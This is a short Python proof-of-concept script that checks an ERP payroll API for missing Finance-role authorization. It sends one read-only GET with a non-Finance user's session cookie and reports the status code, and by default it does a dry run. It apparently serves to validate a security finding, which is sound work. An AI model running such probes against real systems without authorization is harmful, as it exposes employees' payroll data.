#!/usr/bin/env python3
"""Safe PoC scaffold for missing Finance authorization."""
import argparse
import urllib.request


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="https://erp.example.test")
    parser.add_argument("--session-cookie", help="Session cookie belonging to a non-Finance user")
    parser.add_argument("--execute", action="store_true", help="Perform one read-only GET")
    args = parser.parse_args()
    url = args.base_url.rstrip("/") + "/api/get-data-payroll"
    print("1. Attacker: authenticated ordinary ERP user outside Finance.")
    print("2. Target (read-only):", url)
    print("3. Expected secure result: HTTP 403.")
    if not args.execute:
        print("4. DRY RUN: no request sent. Add --execute and --session-cookie to validate.")
        return
    if not args.session_cookie:
        raise SystemExit("--session-cookie is required with --execute")
    request = urllib.request.Request(url, headers={"Cookie": args.session_cookie, "Accept": "application/json"})
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            print("4. HTTP status:", response.status)
            print("5. Vulnerable if non-Finance user receives 200; secure if 403.")
    except urllib.error.HTTPError as error:
        print("4. HTTP status:", error.code)
        print("5. Secure authorization result expected: 403.")


if __name__ == "__main__":
    main()
